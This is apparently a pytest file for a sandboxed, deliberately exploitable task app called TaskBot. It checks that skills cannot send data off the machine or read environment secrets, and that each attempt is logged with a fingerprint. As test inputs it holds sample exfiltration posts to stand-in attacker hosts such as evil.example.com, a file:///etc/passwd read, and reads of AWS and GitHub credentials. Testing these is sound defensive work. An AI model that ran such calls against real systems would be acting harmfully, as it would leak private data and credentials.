"""
Checks for the network channel and the settings channel (app/skills/context.py).

The network channel is where the safety promise is most visible. A skill trying to
send your private task list to some outside address is refused - nothing leaves this
computer - but the attempt, including a fingerprint of exactly what it wanted to
send, is already written down.

That is the whole trick that lets TaskBot be genuinely exploitable and genuinely
harmless at the same time: the exploit succeeds from the attacker's point of view and
from the detector's point of view, and stops at the very last inch.

Covers: feature spec section 7.3; decisions S-19, S-26, S-28; requirements FR-7.2
and FR-7.3; acceptance test A-8 (in part).
"""

from __future__ import annotations

import pytest

from app.monitor import audit_hook
from app.monitor.observations import ObservationLog
from app.skills.context import CapabilityRefused, SkillContext


@pytest.fixture(autouse=True)
def _watcher_installed():
    audit_hook.install_audit_hook()
    yield


@pytest.fixture
def running_skill(tmp_settings):
    notebook = ObservationLog("inv_test")
    context = SkillContext("inv_test", notebook)
    with audit_hook.invocation_scope("inv_test", notebook):
        yield context, notebook


# --- The network channel ---------------------------------------------------------


@pytest.mark.parametrize(
    "outside_address",
    [
        "https://evil.example.com/collect",
        "http://203.0.113.10/steal",
        "https://api.some-service.com/v1/upload",
    ],
)
def test_sending_anywhere_but_this_computer_is_refused(running_skill, outside_address):
    """
    REQUIREMENT FR-7.2 - the promise that nothing ever really leaves.
    """
    context, notebook = running_skill

    with pytest.raises(CapabilityRefused) as refusal:
        context.net.post(outside_address, json={"stolen": "data"})

    assert refusal.value.reason == "non_local_host"
    assert notebook.entries()[0].outcome == "refused"


def test_a_blocked_attempt_still_records_what_it_wanted_to_send(running_skill):
    """
    THE KEY PROPERTY - safety and detection do not compete.

    The request never happens, but the record shows the address, the method, the
    size and a fingerprint of the data. That is a complete security report of an
    attempted theft that never actually occurred.
    """
    context, notebook = running_skill
    private_data = {"tasks": ["Renew passport", "Call the bank"]}

    with pytest.raises(CapabilityRefused):
        context.net.post("https://evil.example.com/collect", json=private_data)

    record = notebook.entries()[0]
    assert record.capability == "net.outbound"
    assert record.resource == "https://evil.example.com/collect"
    assert record.detail["method"] == "POST"
    assert record.detail["bytes"] > 0
    assert len(record.detail["sha256"]) == 64
    assert record.outcome == "refused"


def test_the_fingerprint_of_a_blocked_send_matches_the_data_that_was_read(running_skill):
    """
    This is the mechanism that lets a later check prove "the thing sent is the thing
    that was read from the task list" - the basis of catching quiet data theft.
    """
    context, notebook = running_skill

    tasks = context.tasks.list("all")
    with pytest.raises(CapabilityRefused):
        context.net.post("https://evil.example.com/collect", json=tasks)

    read_record, send_record = notebook.entries()
    assert read_record.detail["sha256"] == send_record.detail["sha256"]


@pytest.mark.parametrize("local_address", ["http://127.0.0.1:9/x", "http://localhost:9/x"])
def test_addresses_on_this_computer_are_allowed_through(running_skill, local_address):
    """
    Local addresses pass the safety check. Nothing is listening on port 9 in these
    tests, so the request then fails - but it failed at the network, not at the
    permission check, which is what this proves.
    """
    context, notebook = running_skill

    with pytest.raises(CapabilityRefused) as refusal:
        context.net.get(local_address)

    # Refused for a technical reason, NOT because the address was disallowed.
    assert refusal.value.reason == "request_failed"
    assert notebook.entries()[0].refusal_reason != "non_local_host"


@pytest.mark.parametrize("odd_address", ["ftp://127.0.0.1/x", "file:///etc/passwd", "gopher://x"])
def test_unknown_ways_of_connecting_are_refused(running_skill, odd_address):
    """Only ordinary web addresses are understood; anything else is refused."""
    context, notebook = running_skill

    with pytest.raises(CapabilityRefused) as refusal:
        context.net.get(odd_address)

    assert refusal.value.reason == "unsupported_scheme"
    assert notebook.entries()[0].outcome == "refused"


def test_a_disguised_outside_address_is_still_refused(running_skill):
    """
    The check looks at the real destination, not at anything that merely mentions a
    local address in passing.
    """
    context, _ = running_skill

    with pytest.raises(CapabilityRefused) as refusal:
        context.net.post("https://evil.example.com/?redirect=127.0.0.1", json={})

    assert refusal.value.reason == "non_local_host"


# --- The settings channel --------------------------------------------------------


def test_a_skill_may_read_taskbot_settings(running_skill, monkeypatch):
    """The app's own settings are readable - they are not secrets."""
    context, notebook = running_skill
    monkeypatch.setenv("TASKBOT_MODEL", "llama3.1:8b")

    value = context.env.get("TASKBOT_MODEL")

    assert value == "llama3.1:8b"
    assert notebook.entries()[0].capability == "env.read"
    assert notebook.entries()[0].detail["present"] is True


@pytest.mark.parametrize(
    "secret_name",
    ["AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN", "PATH", "HOME", "DATABASE_PASSWORD"],
)
def test_real_secrets_are_out_of_reach(running_skill, secret_name, monkeypatch):
    """
    DECISION S-28 and REQUIREMENT FR-7.3.

    Anything that is not one of TaskBot's own settings is refused, so real
    credentials that happen to be in the environment cannot be read through the
    official channel. The attempt is recorded.
    """
    context, notebook = running_skill
    monkeypatch.setenv(secret_name, "a-real-secret-value")

    with pytest.raises(CapabilityRefused) as refusal:
        context.env.get(secret_name)

    assert refusal.value.reason == "key_not_exposed"
    assert notebook.entries()[0].outcome == "refused"


def test_the_ai_model_address_is_not_readable(running_skill):
    """
    DECISION S-28.

    The model address is excluded even though it starts with TASKBOT_, because it is
    a network target rather than a setting - handing it to a skill would be handing
    over a destination.
    """
    context, _ = running_skill

    with pytest.raises(CapabilityRefused) as refusal:
        context.env.get("TASKBOT_OLLAMA_URL")

    assert refusal.value.reason == "key_not_exposed"


def test_an_unset_setting_reads_as_nothing(running_skill, monkeypatch):
    """A setting that is simply not set is not an error - it is just empty."""
    context, notebook = running_skill
    monkeypatch.delenv("TASKBOT_NOT_SET", raising=False)

    assert context.env.get("TASKBOT_NOT_SET") is None
    assert notebook.entries()[0].detail["present"] is False
